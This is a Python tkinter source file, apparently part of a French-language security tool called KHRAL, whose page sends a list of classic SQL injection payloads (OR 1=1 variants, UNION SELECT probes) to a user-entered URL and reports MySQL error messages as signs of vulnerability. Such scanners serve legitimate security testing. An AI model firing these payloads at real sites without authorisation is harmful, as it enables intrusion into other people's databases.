import tkinter as tk
import requests
import urllib.parse

def test_sql_injection(url, results_text):
    """Test SQL injection by sending a malicious payload"""
    payloads = ["' OR '1'='1'--",  # Classic true condition
                "' OR 1=1--",  # Variations
                "' OR 1=1#",
                "' OR 1=1/*",
                "' AND 1=1--",  # True conditional
                "' AND 1=2--",  # False conditional
                "1' UNION SELECT NULL, NULL--",  # UNION-based injection
                "1' UNION SELECT NULL, version()--"]  # Get DB version using UNION
    vulnerable = False
    results_text.delete("1.0", tk.END)

    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if any(err in response.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
                results_text.insert(tk.END, f"Vulnérable avec le payload : {payload}\n")
                vulnerable = True
        except Exception as e:
            results_text.insert(tk.END, f"Erreur lors de la requête : {e}\n")
            return

    if not vulnerable:
        results_text.insert(tk.END, "Aucune vulnérabilité détectée.\n")

def show_sql_page(back_to_menu):
    """Show the SQL Injection page."""
    sql_window = tk.Tk()
    sql_window.title("KHRAL - Injection SQL")
    
    # Définir la taille de la fenêtre
    window_width = 1000
    window_height = 700
    
    # Récupérer les dimensions de l'écran
    screen_width = sql_window.winfo_screenwidth()
    screen_height = sql_window.winfo_screenheight()

    # Calculer les coordonnées pour centrer la fenêtre
    x_position = (screen_width // 2) - (window_width // 2)
    y_position = (screen_height // 2) - (window_height // 2)

    # Positionner la fenêtre au centre de l'écran
    sql_window.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    
    sql_window.config(bg="#2e2e2e")  # Fond sombre pour un look moderne

    # Configurer le grid de manière flexible
    sql_window.grid_columnconfigure(0, weight=1, minsize=400)  # Colonne gauche (logo)
    sql_window.grid_columnconfigure(1, weight=3, minsize=400)  # Colonne centrale (IP + titre)
    sql_window.grid_columnconfigure(2, weight=1, minsize=200)  # Colonne droite (titre + IP)
    
    sql_window.grid_rowconfigure(0, weight=1)  # Ligne pour le logo
    sql_window.grid_rowconfigure(1, weight=2)  # Ligne pour le titre central
    sql_window.grid_rowconfigure(2, weight=3)  # Ligne pour les boutons

    # Logo en haut à gauche
    logo = tk.PhotoImage(file="image/logo.png").subsample(8, 8)
    logo_label = tk.Label(sql_window, image=logo, bg="#2e2e2e")
    logo_label.grid(row=0, column=0, padx=10, pady=10, sticky="nw")

    # Message de bienvenue
    welcome_label = tk.Label(sql_window, text="Bienvenue sur KHRAL!", font=("Helvetica", 14), fg="white", bg="#2e2e2e")
    welcome_label.grid(row=0, column=1, padx=10, pady=10, sticky="ne")

    # Affichage de l'adresse IP de l'utilisateur
    user_ip = get_ip()
    ip_label = tk.Label(sql_window, text=f"Votre IP: {user_ip}", font=("Helvetica", 14), fg="white", bg="#2e2e2e")
    ip_label.grid(row=0, column=2, padx=10, pady=10, sticky="ne")

    # Titre au centre
    title_label = tk.Label(sql_window, text="KHRAL", font=("Helvetica", 32, "bold"), fg="white", bg="#2e2e2e")
    title_label.grid(row=1, column=0, columnspan=3, pady=20)

    # Zone d'entrée pour l'URL
    url_label = tk.Label(sql_window, text="Entrez l'URL à tester :", font=("Helvetica", 14), fg="white", bg="#2e2e2e")
    url_label.grid(row=2, column=1, pady=10)

    url_entry = tk.Entry(sql_window, font=("Helvetica", 14), width=40)
    url_entry.grid(row=3, column=1, pady=10)

    # Zone de texte pour afficher les résultats
    results_text = tk.Text(sql_window, height=15, width=70, font=("Helvetica", 14))
    results_text.grid(row=4, column=0, columnspan=3, pady=10)

    # Bouton pour tester l'injection SQL
    test_button = tk.Button(sql_window, text="Tester l'injection SQL", font=("Helvetica", 14), bg="#4CAF50", fg="white",
                            command=lambda: test_sql_injection(url_entry.get(), results_text))
    test_button.grid(row=5, column=1, pady=10)

    # Bouton pour revenir au menu principal
    back_button = tk.Button(sql_window, text="Retour", font=("Helvetica", 14), command=lambda: [sql_window.destroy(), back_to_menu()])
    back_button.grid(row=6, column=1, pady=10)

    sql_window.mainloop()

def get_ip():
    try:
        response = requests.get("https://api.ipify.org")
        ip = response.text
        return ip
    except requests.exceptions.RequestException:
        return "IP non disponible"
